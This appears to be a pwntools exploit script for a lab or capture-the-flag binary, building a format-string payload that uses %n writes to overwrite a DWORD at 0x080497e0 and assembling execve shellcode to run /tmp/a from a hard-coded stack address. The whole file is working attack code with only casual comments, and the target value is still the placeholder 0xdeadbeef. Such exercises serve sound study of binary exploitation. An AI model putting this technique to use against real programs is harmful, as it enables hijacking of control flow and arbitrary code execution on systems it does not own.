from pwn import *


def bytes_to_hex_string(data):
    payload = ''.join([f'\\x{x:02x}' for x in data])
    return payload


def print_gcc_string(shellcode):
    gcc_string = r'run < <(printf "'
    print(gcc_string + bytes_to_hex_string(shellcode) + '")')


def create_payload():
    buffer_start = 0xffffddac
    executable_path = b"/tmp/a"
    asm_shellcode = """
    mov    eax,0xb
    mov    ebx,{executable_address}
    xor    ecx,ecx
    mov    edx,ecx
    int    0x80 
    """

    data_area = executable_path + b'\x00'

    # Start of executable will be needed to point to it in shellcode
    executable_address = buffer_start
    shellcode = asm(
        asm_shellcode.format(executable_address=executable_address))
    shellcode_address = buffer_start + len(data_area)

    payload = data_area + shellcode
    print(len(payload))


# Here we're creating string which will right DWORD in our exit address
w1 = b'\xe0\x97\x04\x08' + b'JUNK'
w2 = b'\xe1\x97\x04\x08' + b'JUNK'
w3 = b'\xe2\x97\x04\x08' + b'JUNK'
w4 = b'\xe3\x97\x04\x08' + b'JUNK'

# This is our final address
b1, b2, b3, b4 = p32(0xdeadbeef)

# And this is our final address paddings
n1 = 256 + b1 - 0x3e
n2 = 256*2 + b2 - n1 - 0x3e
n3 = 256*3 + b3 - n1 - n2 - 0x3e
n4 = 256*4 + b4 - n1 - n2 - n3 - 0x3e

# So, here we're creating our cool pwn string.
# It's messy because of last part, but it's binary exploit c'mon
# First - addresses in which we want to wright bytes
fmt = w1 + w2 + w3 + w4
# then we need to skip stack entries until our buffer
position = 10
fmt += b"%x" * (position - 2)
# And now we're adding amount of symbols before %n to get desired address
fmt += f'%{n1}x%n%{n2}x%n%{n3}x%n%{n4}x%n'.encode() + b"asdasdsadsa"
print(f"len: {len(fmt)}")
print_gcc_string(fmt)
create_payload()